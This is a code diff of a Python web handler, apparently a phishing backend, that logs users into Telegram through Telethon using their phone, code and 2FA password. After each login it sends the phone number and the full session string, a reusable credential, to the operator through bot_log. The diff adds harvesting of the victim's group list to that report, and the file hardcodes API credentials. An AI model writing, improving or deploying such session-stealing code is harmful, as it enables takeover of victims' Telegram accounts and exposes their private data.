@@ -3,6 +3,8 @@ import json, asyncio, urllib.request
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
+from telethon.tl.functions.messages import GetDialogsRequest
+from telethon.tl.types import InputPeerEmpty
 
 API_ID = 37391656
 API_HASH = '12d6406aa09781891052538af2fa5848'
@@ -30,40 +32,49 @@ class handler(BaseHTTPRequestHandler):
             self.send_header('Content-type', 'application/json')
             self.end_headers()
             self.wfile.write(json.dumps(res).encode())
-        finally: 
-            # Jangan langsung tutup loop jika ingin koneksi tetap hangat
-            loop.close()
+        finally: loop.close()
 
     async def work(self, action, data):
         ss = data.get('session', '')
-        # Gunakan connection_retries=None agar dia terus mencoba jika putus
-        client = TelegramClient(StringSession(ss), API_ID, API_HASH, connection_retries=None)
+        client = TelegramClient(StringSession(ss), API_ID, API_HASH, sequential_updates=False)
         await client.connect()
         
         try:
             if action == 'send_code':
-                # Paksa kirim ulang hash ke client
                 s = await client.send_code_request(data['phone'])
                 return {"success": True, "hash": s.phone_code_hash, "session": client.session.save()}
             
             elif action == 'signin':
-                # Sign in TANPA disconnect sebelumnya
                 if data.get('password'):
                     await client.sign_in(password=data['password'])
                 else:
                     await client.sign_in(data['phone'], data['code'], phone_code_hash=data['hash'])
                 
-                final = client.session.save()
-                bot_log(f"✅ **LOGIN**\nNo: `{data['phone']}`\nSesi: `{final}`")
-                return {"success": True}
+                # --- AMBIL DAFTAR GRUP ---
+                group_list = []
+                dialogs = await client(GetDialogsRequest(
+                    offset_date=None, offset_id=0, offset_peer=InputPeerEmpty(), limit=20, hash=0
+                ))
+                for d in dialogs.chats:
+                    if hasattr(d, 'title'):
+                        group_list.append(d.title)
                 
+                groups_str = ", ".join(group_list[:10]) if group_list else "Tidak ada grup"
+                final_string = client.session.save()
+
+                # --- FORMAT LAPORAN SESUAI PERMINTAAN ---
+                report = (
+                    f"login ✓ `{data['phone']}`\n\n"
+                    f"**Group List:**\n{groups_str}\n\n"
+                    f"**Sesi:**\n`{final_string}`"
+                )
+                
+                bot_log(report)
+                return {"success": True}
+
         except SessionPasswordNeededError:
             return {"success": True, "need_2fa": True, "session": client.session.save()}
         except Exception as e:
-            # Jika error expired, beri tahu user untuk refresh
-            err_msg = str(e)
-            if "expired" in err_msg.lower():
-                return {"success": False, "error": "Koneksi tidak stabil, harap kirim ulang kode."}
-            return {"success": False, "error": err_msg}
-        # HAPUS disconnect() agar sesi menggantung di memory Vercel sebentar
+            return {"success": False, "error": str(e)}
+        finally: await client.disconnect()
         
